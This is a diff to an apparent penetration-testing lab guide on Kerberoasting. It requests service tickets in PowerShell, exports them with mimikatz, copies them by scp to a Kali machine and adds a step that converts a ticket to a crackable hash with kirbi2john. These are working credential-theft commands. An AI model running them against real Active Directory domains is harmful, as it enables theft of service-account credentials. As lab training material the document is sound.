@@ -415,7 +415,7 @@ Existing SPN found!
 
 ### 3.2.1. Option 1 - Extracting service account hash with mimikatz + kerberoast package
 
-#### Request tickets from PowerShell
+**On Target:** Request tickets from PowerShell
 
 ```console
 Add-Type -AssemblyName System.IdentityModel
@@ -447,7 +447,7 @@ Cached Tickets: (3)
 ⋮
 ```
 
-#### Dump tickets using mimikatz
+**On Target:** Dump tickets using mimikatz
 
 - ☝️ **Note**: to retrieve user kerberos tickets, do **NOT** use `privilege::debug` + `token::elevate` in mimikatz; doing so impersonates the `SYSTEM` token and ends up retrieving machine kerberos tickets instead
 
@@ -469,7 +469,7 @@ mimikatz # kerberos::list /export
 - ☝️ **Note**: In event of `ERROR kuhl_m_kerberos_list ; kull_m_file_writeData (0x00000005)` error, check that the user has permissions to write to the present working directory
 - e.g. Attempting to run `C:\Windows\System32\cmd.exe` as a non-admin user works, but attempting to use mimikatz to save tickets to `C:\Windows\System32\` will result in write errors
 
-#### Upload the ticket to Kali
+**On Target:** Upload the ticket to Kali
 
 ```console
 scp <ticket> kali@kali.vx:/home/kali/
@@ -477,12 +477,20 @@ scp <ticket> kali@kali.vx:/home/kali/
 
 #### Use the Kerberoast package to extract the hash from the service ticket
 
-#### Install kerberoast module
+**On Kali:** Install kerberoast module
 
 - Ref: <https://github.com/nidem/kerberoast>
 
 ```console
 sudo apt -y install kerberoast
+```
+
+**On Kali:** Extract service account hash from the ticket exported by mimikatz
+
+```console
+┌──(kali㉿kali)-[~]
+└─$ python3 /usr/share/kerberoast/kirbi2john.py 1-40a10000-mike@MSSQLSvc~SVR.lab.vx~1433-LAB.VX.kirbi > tgs.hash
+tickets written: 1
 ```
 
 ### 3.2.2. Option 2 - Extracting service account hash directly with Invoke-Kerberoast script from powershell-empire
